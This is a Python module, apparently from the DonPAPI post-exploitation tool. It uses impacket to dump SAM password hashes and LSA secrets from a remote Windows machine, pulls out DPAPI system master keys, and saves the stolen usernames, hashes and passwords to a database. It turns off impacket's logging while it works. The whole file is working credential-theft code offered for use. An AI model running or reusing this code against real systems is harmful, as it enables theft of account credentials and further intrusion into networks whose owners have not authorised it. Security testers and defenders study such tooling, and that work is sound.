from binascii import unhexlify
import logging
from impacket.examples.regsecrets import LSASecrets, SAMHashes, RemoteOperations

class SAMDump:
    def __init__(self, remote_ops, bootkey) -> None:
        self.remote_ops = remote_ops
        self.bootkey = bootkey
        
        self.sam = None
        self.items_found = None
        
    def dump(self):
        logging.getLogger("impacket").disabled = True
        self.sam = SAMHashes(bootKey=self.bootkey, perSecretCallback = self.idle, remoteOps=self.remote_ops)
        self.sam.dump()
        self.items_found = self.sam._SAMHashes__itemsFound

    def save_to_db(self, db, hostname):
        for sam_entry in self.items_found.values():
            entry = sam_entry.split(':')
            db.add_samhash(sam_entry, hostname)
            db.add_secret(computer=hostname,collector="SAM",windows_user="SYSTEM",username=entry[0],password=entry[3],program="SAM")
            
    def idle(self, _):
        pass

class LSADump(LSASecrets):
    def __init__(self, remote_ops, bootkey) -> None:
        self.remote_ops = remote_ops
        self.bootkey = bootkey

        self.lsa = None
        self.secrets = None

    def dump(self):
        logging.getLogger("impacket").disabled = True
        self.lsa = LSASecrets(bootKey=self.bootkey, perSecretCallback = self.idle, remoteOps=self.remote_ops)
        self.lsa.dumpSecrets()
        self.secrets = self.lsa._LSASecrets__secretItems
        
    def get_dpapiSystem_keys(self):
        dpapiSystem = {}
        for secret in self.secrets:
            if secret.startswith("dpapi_machinekey:"):
                machineKey, userKey = secret.split('\n')
                machineKey = machineKey.split(':')[1]
                userKey = userKey.split(':')[1]
                dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
                dpapiSystem['UserKey'] = unhexlify(userKey[2:])
                return dpapiSystem
            
    def save_secrets_to_db(self, db, hostname):
        for lsa_secret in self.secrets:
            if lsa_secret.count(':')==1:
                username, password = lsa_secret.split(':')
                if username not in ['dpapi_machinekey', 'dpapi_userkey', 'NL$KM']:
                    db.add_secret(computer=hostname, windows_user="SYSTEM", username=username, password=password, collector="LSA")
            
    def idle(self, _, _2):
        pass

class DonPAPIRemoteOperations(RemoteOperations):
    pass
